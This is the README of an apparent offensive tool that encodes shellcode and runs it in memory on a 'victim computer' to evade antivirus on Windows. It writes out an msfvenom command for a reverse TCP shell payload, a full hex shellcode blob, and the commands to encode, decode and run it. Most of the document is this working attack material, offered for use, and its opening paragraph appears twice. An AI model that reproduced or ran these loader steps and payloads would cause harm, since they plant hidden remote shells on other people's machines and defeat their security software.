# Shellcode-Loader-ByteMap

The tool has two functionalities:
1. Encodes the shellcode payload using a ByteMap of the file (key file). The key files could be the compiled Golang project itself.
2. Loads the encoded shellcode into memory and runs it on the victim computer.

Use it to bypass AV's. Support only Windows as of now.

# Shellcode-Loader-ByteMap
> 1. Encode your shellcode. 2. Run your encoded shellcode and bypass AV.


The tool has two functionalities:
1. Encodes the shellcode payload using a ByteMap of the file (key file). The key files could be the compiled Golang project itself.
2. Loads the encoded shellcode into memory and runs it on the victim computer.

Use it to bypass AV's. Support only Windows as of now.

## Installation

Windows for 32bit payloads:

```sh
go env -w GOARCH=386
go build -o loader32.exe
```

Windows for 64bit payloads:

```sh
go env -w GOARCH=amd64
go build -o loader64.exe
```

## Usage example

Create your shellcode (ex. msfvenom):
```sh
msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=444 -f hex
```

Encode you shellcode with the Golang binary as the key file (any file can be used, as long as the file contains all 256 bytes in it):
```sh
loader64.exe encode ./loader64.exe encodedPayloadFileName.enc fc4883e4f0e8cc00000041514150524831d265488b5260488b5218488b52205156488b72504d31c9480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d08b4818448b4020504901d0e35648ffc9418b34884d31c94801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b0488415841585e4801d0595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020001bc7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5
```

Run the encoded payload:
```sh
loader64.exe decode-run ./loader64.exe encodedPayloadFileName.enc
```

Full process GIF:


## Info

Emil Opachevsky – [@0xEmil](https://twitter.com/dbader_org) – emil@Cyincore.com
